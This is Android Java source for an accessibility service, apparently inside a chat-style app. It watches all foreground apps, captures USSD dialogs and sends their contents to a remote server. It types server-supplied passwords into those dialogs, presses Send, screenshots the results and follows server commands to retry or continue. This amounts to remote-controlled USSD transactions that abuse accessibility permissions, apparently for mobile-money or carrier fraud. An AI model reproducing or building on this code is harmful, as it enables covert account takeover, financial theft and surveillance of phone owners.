package com.project.setussd.service.chato;

import android.accessibilityservice.AccessibilityService;
import android.annotation.SuppressLint;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Rect;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

import com.google.gson.Gson;
import com.project.setussd.Contact;
import com.project.setussd.activity.chato.ChatOneActivity;
import com.project.setussd.bean.DevNodeInfo;
import com.project.setussd.bean.UssAction;
import com.project.setussd.log.UssdLogger;
import com.project.setussd.network.ApiCallback;
import com.project.setussd.network.ApiClient;
import com.project.setussd.utils.CacheUtils;
import com.project.setussd.utils.chato.DialogFinder;
import com.project.setussd.utils.chato.NodeUtils;
import com.project.setussd.utils.chato.ScreenCaptureManager;
import com.project.setussd.utils.chato.UssdController;
import com.project.setussd.utils.chato.UssdState;

import java.io.ByteArrayOutputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

@SuppressLint("AccessibilityPolicy")
public class ChatUssadAccessibilityService extends AccessibilityService {

    private static final long STABLE_TIME = 1200;
    private static final long INPUT_DELAY = 1200;
    private static final long CLICK_DELAY = 800;
    private static final long RESULT_DELAY = 500;
    private int lastDialogHash = 0;
    //    private boolean isProcessing = false;
    private long lastTextChangeTime = 0;
    private String lastText = "";
    private boolean isTaskRunning = false;
    private boolean isFinished = false;

    private final Handler handler = new Handler(Looper.getMainLooper());
    private static final String[] USSD_PACKAGES = {
            "com.android.phone",
            "com.android.server.telecom",
            "com.android.incallui",
            "huawei.android.dialer",
            "miui.phone"
    };
    private static ChatUssadAccessibilityService instance;

    public static ChatUssadAccessibilityService getInstance() {
        return instance;
    }

    //
    private Gson gson = new Gson();

    //
    public static List<String> allPkg1List = new ArrayList<>();
    public static List<String> allPkg2List = new ArrayList<>();

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

//        Log.i("USSD_LOG", "getEventType: " + event.getEventType());
//        Log.i("USSD_LOG", "getClassName: " + event.getClassName());
//        Log.i("USSD_LOG", "getPackageName: " + event.getPackageName());

        // pkg1
        String pkg = event.getPackageName().toString();
        if (pkg.contains("com.project.setussd")) return; // 自己程序的不包含
        if (!allPkg1List.contains(pkg)) {  // 保存
            allPkg1List.add(pkg);
        }

        //
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        //
        try {
            handleUssdEvent1(event, root);
        } finally {
            root.recycle();
        }
    }

    // 这里：检测到了弹窗
    private void handleUssdEvent1(AccessibilityEvent event, AccessibilityNodeInfo root) {
        // pkg2
        String pkg2 = root.getPackageName().toString();
        if (pkg2.contains("com.project.setussd")) return; // 自己程序的不包含
        if (!allPkg2List.contains(pkg2)) {  // 保存
            allPkg2List.add(pkg2);
        }

        //
        if (isFinished || !isTaskRunning) return;
        //
        CharSequence pkg = event.getPackageName();
        if (pkg == null) return;
        String pkgName = event.getPackageName().toString();
        //
//        if (!isUssdPackage(pkg)) {
//            String txt1 = "none";
//            if (pkg != null) {
//                txt1 = pkg.toString();
//            }
//            //            UssdLogger.log(ChatOneActivity.mianActivity, "!isUssdPackage: " + txt1);
//            return;
//        }

        String pkgName2 = root.getPackageName().toString();
        //
        UssdLogger.log(ChatOneActivity.mianActivity, "检测到USSD弹窗");

        //
        DisplayMetrics dm = getResources().getDisplayMetrics();
        AccessibilityNodeInfo dialog = DialogFinder.findDialog(root, dm);

        if (dialog == null) {
            UssdLogger.log(this, "弹窗无对象");
            return;
        }

        // 获取所有的文字，包括按钮的
        String text = NodeUtils.getUssdResultText(root, dialog);
        if (text == null || text.trim().isEmpty()) {
            UssdLogger.log(this, "弹窗无文字");
            return;
        }

        // 打印出来
        //UssdLogger.log(this, "弹窗文字: " + text);

        // 如果是在执行中
//        if (text.toLowerCase().contains("running") ||
//                text.toLowerCase().contains("processing")) {
//            UssdLogger.log(this, "弹窗是执行中");
//            return;
//        }

        // 录制中
        if (isScreenCaptureDialog(root)) {
            UssdLogger.log(this, "isScreenCaptureDialog");
            return;
        }

        // test
        handleMineDialog(dialog, pkgName, pkgName2);

        AccessibilityNodeInfo input = findUssdInput(dialog);
//        if (input != null) {
//            UssdLogger.log(this, "发现输入框，准备输入密码");
//            handleInputDialog(input, dialog, text, dm);
//        } else {
//            UssdLogger.log(this, "无输入框");
//            handleResultDialog(dialog, text, dm);
//        }

        // 测试
//        Log.i("USSD_LOG", "----");
//        List<DevNodeInfo> nodeList = new ArrayList<>();
//        DevNodeInfo info = mineTestNodeInfo(root, nodeList);
//        String json1 = gson.toJson(info);
//        String json2 = gson.toJson(nodeList);
//        Log.i("USSD_LOG", "json1: " + json1);
//        Log.i("USSD_LOG", "json2: " + json2);
        // 测试
//        handleMineDialog(input, dialog, text, dm);

    }


    public DevNodeInfo mineTestNodeInfo(AccessibilityNodeInfo root, List<DevNodeInfo> nodeList) {
        if (root == null) return null;
        //
        DevNodeInfo info1 = new DevNodeInfo();
        DevNodeInfo info2 = new DevNodeInfo();
        //
        info1.viewIdResourceName = root.getViewIdResourceName();
        info2.viewIdResourceName = root.getViewIdResourceName();
        //
        info1.packageName = root.getPackageName().toString();
        info2.packageName = root.getPackageName().toString();
        //
        CharSequence cn = root.getClassName();
        if (cn != null) {
            info1.className = cn.toString();
            info2.className = cn.toString();
        }
        //
        CharSequence tx = root.getText();
        if (tx != null) {
            info1.text = tx.toString();
            info2.text = tx.toString();
        }
        //
        if (root.isClickable()) {
            info1.clickable = true;
            info2.clickable = true;
        }
        //
        nodeList.add(info2);
        //
    //        Log.i("USSD_LOG", "getViewIdResourceName: " + root.getViewIdResourceName());
    //        Log.i("USSD_LOG", "getClassName: " + root.getClassName());
    //        Log.i("USSD_LOG", "getText: " + root.getText());
        //
        if (root.getChildCount() > 0) {
            info1.subs = new ArrayList<>();
            for (int i = 0; i < root.getChildCount(); i++) {
                AccessibilityNodeInfo child = root.getChild(i);
                if (child != null) {
                    DevNodeInfo sub = mineTestNodeInfo(child, nodeList);
                    if (sub != null) {
                        info1.subs.add(sub);
                    }
                }
            }
        }
        return info1;
    }

    public void startUssdTask() {
        isTaskRunning = true;
        isFinished = false;
        UssdState.reset();
    }

    private void finishTask(String result) {
        if (isFinished) return;
        isFinished = true;
        isTaskRunning = false;
        sendResult(null, result);
        UssdLogger.log(this, "任务结束：" + result);
        resetState();
    }

    private boolean isUssdPackage(CharSequence pkg) {
        if (pkg == null) return false;
        String p = pkg.toString();
        for (String s : USSD_PACKAGES) {
            if (p.contains(s)) return true;
        }
        return false;
    }

    // 自己测试的
    private void handleMineDialog(AccessibilityNodeInfo dialog, String str, String str2) {
        if (isSameDialog(dialog)) {
            return;
        }
        // 测试
        Log.i("USSD_LOG", "----");
        List<DevNodeInfo> nodeList = new ArrayList<>();
        DevNodeInfo info = mineTestNodeInfo(dialog, nodeList);
        String json1 = gson.toJson(info);
        String json2 = gson.toJson(nodeList);
        Log.i("USSD_LOG", "json1: " + json1);
        Log.i("USSD_LOG", "json2: " + json2);

        // 提交数据
        Map<String, String> params = new HashMap<>();
        params.put("msg", str + " / " + str2 + " / " + lastDialogHash + " / " + json2);
        ApiClient.request("/apin/vdfapp/msg", params, UssAction.class, new ApiCallback<UssAction>() {
            @Override
            public void onSuccess(UssAction data) {
                UssdLogger.log(ChatUssadAccessibilityService.this, "上报成功 Mine");
                lastDialogHash = 0;
            }

            @Override
            public void onError(int code, String msg) {
                UssdLogger.log(ChatUssadAccessibilityService.this, "上报失败 Mine");
                lastDialogHash = 0;
            }

            @Override
            public void onFailure(String error) {
                UssdLogger.log(ChatUssadAccessibilityService.this, "上报失败，网络错误 Mine");
                lastDialogHash = 0;
            }
        });
    }

    private void handleInputDialog(AccessibilityNodeInfo input,
                                   AccessibilityNodeInfo dialog,
                                   String text,
                                   DisplayMetrics dm) {
        if (!isSameDialog(dialog)) {
            UssdState.inputCount.incrementAndGet();
        }

        Map<String, String> params = new HashMap<>();
        params.put("msg", text);
        UssdLogger.log(this, "请求接口,获取密码或者其他");
        ApiClient.request("/use/pwd", params, UssAction.class, new ApiCallback<UssAction>() {
            @Override
            public void onSuccess(UssAction data) {
                String password = data.password;

                if (UssdState.inputCount.get() == 1 && !UssdState.handledFirst.get()) {
                    UssdState.handledFirst.set(true);
                    handleFirstInput(input, dialog, password);
                } else if (UssdState.inputCount.get() == 2 && !UssdState.handledSecond.get()) {
                    UssdState.handledSecond.set(true);
                    handleSecondInput(dialog, text, dm);
                }
            }

            @Override
            public void onError(int code, String msg) {
                UssdLogger.log(ChatUssadAccessibilityService.this, "请求失败：" + msg);
            }

            @Override
            public void onFailure(String error) {
                UssdLogger.log(ChatUssadAccessibilityService.this, "网络错误：" + error);
            }
        });
    }

    private void handleFirstInput(AccessibilityNodeInfo input,
                                  AccessibilityNodeInfo dialog,
                                  String password) {
        Toast.makeText(getApplicationContext(),
                "sendussd-inputCount:" + UssdState.inputCount.get() + "--" + UssdState.handledFirst.get(),
                Toast.LENGTH_LONG).show();

        if (!UssdController.hasInput) {
            UssdController.hasInput = true;

            handler.postDelayed(() -> {
                boolean success = inputText(input, password);
                if (success) {
                    UssdLogger.log(ChatUssadAccessibilityService.this, "自动输入密码完成");
                    handler.postDelayed(() -> {
                        if (!clickSend(dialog)) {
                            UssdLogger.log(ChatUssadAccessibilityService.this, "发送失败");
                            handleSendFail("发送失败");
                        }
                    }, CLICK_DELAY);
                }
            }, INPUT_DELAY);
        }
    }

    private void handleSecondInput(AccessibilityNodeInfo dialog,
                                   String text,
                                   DisplayMetrics dm) {
        handler.postDelayed(() -> {
            UssdLogger.log(ChatUssadAccessibilityService.this, "正在截图");
            captureAndSend(dialog, text, dm);
            clickCancel(dialog);
        }, CLICK_DELAY);
    }

    private void handleResultDialog(AccessibilityNodeInfo dialog,
                                    String text,
                                    DisplayMetrics dm) {
        //Log.i(Contact.TAG, "onAccessibilityEvent0: " + text);

        if (text.toLowerCase().contains("正在运行") ||
                text.toLowerCase().contains("running")) {
            UssdLogger.log(this, "正在运行USSD代码");
            return;
        }

        if (isImmediateError(text)) {  // 是否直接失败
            if (isFinishedFail(text)) { // 是否结束失败
                handleSendFail(text);
            }
            captureAndSend(dialog, text, dm);
            finishTask(text);
            return;
        }

        handleFinal(dialog, text);
        lastDialogHash = 0;
    }

    private void handleSendFail(String text) {
        UssdLogger.log(this, "发送失败，上传后台：" + text);
        Map<String, String> params = new HashMap<>();
        params.put("msg", text);

        ApiClient.request("/apin/vdfapp/msg", params, UssAction.class, new ApiCallback<UssAction>() {
            @Override
            public void onSuccess(UssAction data) {
                UssdLogger.log(ChatUssadAccessibilityService.this, "上报成功");
                handler.post(() -> executeAction(data));
            }

            @Override
            public void onError(int code, String msg) {
                UssdLogger.log(ChatUssadAccessibilityService.this, "上报失败");
            }

            @Override
            public void onFailure(String error) {
                UssdLogger.log(ChatUssadAccessibilityService.this, "上报失败，网络错误");
            }
        });
    }

    private void executeAction(UssAction data) {
        if (data == null) return;

        switch (data.action) {
            case "1":
                UssdLogger.log(this, "继续输入密码");
                UssdState.handledFirst.set(false);
                break;
            case "2":
                UssdLogger.log(this, "重新发起 ussd");
                UssdState.reset();
                String ussdCode = CacheUtils.getString(getApplicationContext(), "USSDCODE");
                UssdController.start(this, ussdCode);
                break;
            case "3":
                UssdLogger.log(this, "终止任务");
                break;
        }
    }

    private boolean isScreenCaptureDialog(AccessibilityNodeInfo root) {
        if (root == null) return false;

        List<AccessibilityNodeInfo> list = root.findAccessibilityNodeInfosByText("开始录制");
        if (list != null && !list.isEmpty()) return true;

        list = root.findAccessibilityNodeInfosByText("Start now");
        return list != null && !list.isEmpty();
    }

    private synchronized boolean isSameDialog(AccessibilityNodeInfo node) {
        if (node == null) return false;

        Rect r = new Rect();
        node.getBoundsInScreen(r);
        int hash = r.toShortString().hashCode();
        //UssdLogger.log(ChatUssadAccessibilityService.this, "hash:" + hash);

        if (hash == lastDialogHash) {
            //UssdLogger.log(ChatUssadAccessibilityService.this, "相同的");
            return true;
        }

        //UssdLogger.log(ChatUssadAccessibilityService.this, "不相同");
        lastDialogHash = hash;
        return false;
    }

    private AccessibilityNodeInfo findUssdInput(AccessibilityNodeInfo node) {
        if (node == null) return null;

        CharSequence pkg = node.getPackageName();
        if (pkg == null || !(pkg.toString().contains("phone") ||
                pkg.toString().contains("telecom"))) {
            return null;
        }

        if ("android.widget.EditText".contentEquals(node.getClassName())) {
            return node;
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo result = findUssdInput(child);
                if (result != null) {
                    child.recycle();
                    return result;
                }
                child.recycle();
            }
        }

        return null;
    }

    private boolean inputText(AccessibilityNodeInfo node, String text) {
        try {
            Bundle b = new Bundle();
            b.putCharSequence(
                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                    text
            );
            return node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
        } catch (Exception e) {
            return false;
        }
    }

    private boolean clickSend(AccessibilityNodeInfo dialog) {
        if (dialog == null) return false;

        if (NodeUtils.click(dialog, "android:id/button1")) {
            UssdLogger.log(this, "点击发送（系统按钮 button1）");
            return true;
        }

        if (NodeUtils.click(dialog, "android:id/button2")) {
            UssdLogger.log(this, "点击发送（系统按钮 button2）");
            return true;
        }

        AccessibilityNodeInfo btn = findClickableButton(dialog);
        if (btn != null) {
            CharSequence txt = btn.getText();
            btn.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            UssdLogger.log(this, "点击发送（自动识别按钮）:" + txt);
            return true;
        }

        if (NodeUtils.clickByText(dialog, "Send") ||
                NodeUtils.clickByText(dialog, "OK") ||
                NodeUtils.clickByText(dialog, "发送") ||
                NodeUtils.clickByText(dialog, "确定") ||
                NodeUtils.clickByText(dialog, "إرسال")) {
            UssdLogger.log(this, "点击发送（文本匹配）");
            return true;
        }

        UssdLogger.log(this, "点击发送失败（未找到按钮）");
        return false;
    }

    private AccessibilityNodeInfo findClickableButton(AccessibilityNodeInfo node) {
        if (node == null) return null;

        if ("android.widget.Button".contentEquals(node.getClassName()) &&
                node.isClickable()) {
            return node;
        }

        if ("android.widget.TextView".contentEquals(node.getClassName()) &&
                node.isClickable()) {
            CharSequence text = node.getText();
            if (text != null) {
                String t = text.toString().toLowerCase();
                if (t.contains("send") || t.contains("ok") ||
                        t.contains("yes") || t.contains("确认") ||
                        t.contains("إرسال")) {
                    return node;
                }
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo res = findClickableButton(child);
                if (res != null) {
                    child.recycle();
                    return res;
                }
                child.recycle();
            }
        }

        return null;
    }

    private void clickCancel(AccessibilityNodeInfo dialog) {
        if (NodeUtils.click(dialog, "android:id/button2")) return;
        NodeUtils.clickByText(dialog, "Cancel");
        NodeUtils.clickByText(dialog, "取消");
    }

    private void captureAndSend(AccessibilityNodeInfo dialog,
                                String text,
                                DisplayMetrics dm) {
        Rect rect = new Rect();
        dialog.getBoundsInScreen(rect);

        Bitmap full = ScreenCaptureManager.capture();
        if (full == null) return;

        float scaleX = full.getWidth() * 1f / dm.widthPixels;
        float scaleY = full.getHeight() * 1f / dm.heightPixels;

        Rect scaled = new Rect(
                (int) (rect.left * scaleX),
                (int) (rect.top * scaleY),
                (int) (rect.right * scaleX),
                (int) (rect.bottom * scaleY)
        );

        Bitmap crop = safeCrop(full, scaled);
        if (crop != null) {
            sendResult(crop, text);
        }
    }

    private Bitmap safeCrop(Bitmap full, Rect rect) {
        if (full == null || rect == null) return null;

        int bitmapWidth = full.getWidth();
        int bitmapHeight = full.getHeight();

        int left = Math.max(0, rect.left);
        int top = Math.max(0, rect.top);
        int right = Math.min(bitmapWidth, rect.right);
        int bottom = Math.min(bitmapHeight, rect.bottom);

        int width = right - left;
        int height = bottom - top;

        if (width <= 0 || height <= 0) return null;

        try {
            return Bitmap.createBitmap(full, left, top, width, height);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    private void sendResult(Bitmap bmp, String text) {
        try {
            Log.i(Contact.TAG, "sendussd-结果：" + text);
            Intent intent = new Intent(Contact.ACTION_USSD_RESULT);

            String status = "result";
            if (text.startsWith("ERROR")) {
                status = "error";
            } else if (text.startsWith("SUCCESS")) {
                status = "success";
            }

            intent.putExtra(Contact.STATUS_TEXT, status);
            intent.putExtra(Contact.EXTRA_TEXT, text);

            if (bmp != null) {
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                bmp.compress(Bitmap.CompressFormat.JPEG, 70, baos);
                byte[] bytes = baos.toByteArray();
                intent.putExtra(Contact.EXTRA_IMG, bytes);
            }

            intent.setPackage(this.getPackageName());
            sendBroadcast(intent);

        } catch (Exception e) {
            e.printStackTrace();
            Log.i(Contact.TAG, "sendussd-e: " + e.getMessage());
        }
    }

    private boolean isFinishedFail(String text) {
        if (text == null) return false;

        return text.contains("失败") || text.contains("错误") ||
                text.contains("无效") || text.contains("MMI") ||
                text.contains("连接问题") || text.contains("无法连接") ||
                text.contains("network") || text.contains("invalid") ||
                text.contains("无法访问") || text.toLowerCase().contains("error") ||
                text.contains("خطأ") || text.contains("غير صالح") ||
                text.contains("Connection issue") || text.contains("مشكلة في الاتصال") ||
                text.contains("Cannot connect") || text.contains("لا يمكن الاتصال") ||
                text.contains("Network exception") || text.contains("استثناء في الشبكة") ||
                text.contains("Password error") || text.contains("خطأ في كلمة المرور") ||
                text.contains("Password expired") || text.contains("كلمة المرور منتهية الصلاحية") ||
                text.contains("Interrupted") || text.contains("مقطوع");
    }

    private boolean isImmediateError(String text) {
        if (text == null) return false;

        return text.contains("成功") || text.contains("success") ||
                text.contains("النجاح") || text.contains("نجحت العملية") ||
                text.contains("تمت العملية بنجاح") || isFinishedFail(text);
    }

    private void handleFinal(AccessibilityNodeInfo dialog,
                             String text) {
        long now = System.currentTimeMillis();

        if (!text.equals(lastText)) {
            lastText = text;
            lastTextChangeTime = now;
            return;
        }

        if (now - lastTextChangeTime < STABLE_TIME) return;

        if (!isFinalDialog(dialog)) return;

        handleResult(dialog, text, "RESULT");
    }

    private boolean isFinalDialog(AccessibilityNodeInfo dialog) {
        if (findUssdInput(dialog) != null) return false;

        List<AccessibilityNodeInfo> buttons = findButtons(dialog);
        if (buttons.size() == 1) return true;

        for (AccessibilityNodeInfo btn : buttons) {
            CharSequence t = btn.getText();
            if (t != null && t.toString().toLowerCase().contains("send")) {
                return false;
            }
        }

        return true;
    }

    private List<AccessibilityNodeInfo> findButtons(AccessibilityNodeInfo node) {
        List<AccessibilityNodeInfo> list = new ArrayList<>();
        collectButtons(node, list);
        return list;
    }

    private void collectButtons(AccessibilityNodeInfo node,
                                List<AccessibilityNodeInfo> list) {
        if (node == null) return;

        if ("android.widget.Button".contentEquals(node.getClassName()) &&
                node.isClickable()) {
            list.add(node);
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                collectButtons(child, list);
                child.recycle();
            }
        }
    }

    private void handleResult(AccessibilityNodeInfo dialog,
                              String text,
                              String type) {
        handler.postDelayed(() -> {
            sendResult(null, type + ":" + text);
            clickClose(dialog);
            resetState();
        }, RESULT_DELAY);
    }

    private void clickClose(AccessibilityNodeInfo dialog) {
        if (NodeUtils.click(dialog, "android:id/button1")) return;

        List<AccessibilityNodeInfo> buttons = findAllButtons(dialog);
        if (buttons.size() == 1) {
            buttons.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
            return;
        }

        NodeUtils.clickByText(dialog, "OK");
        NodeUtils.clickByText(dialog, "确定");
    }

    private List<AccessibilityNodeInfo> findAllButtons(AccessibilityNodeInfo node) {
        List<AccessibilityNodeInfo> list = new ArrayList<>();
        collectButtons(node, list);
        return list;
    }

    private void resetState() {
//        isProcessing = false;
        lastText = "";
        lastTextChangeTime = 0;
        UssdState.reset();
        UssdController.hasInput = false;
        lastDialogHash = 0;
    }

    @Override
    public void onInterrupt() {
    }
}
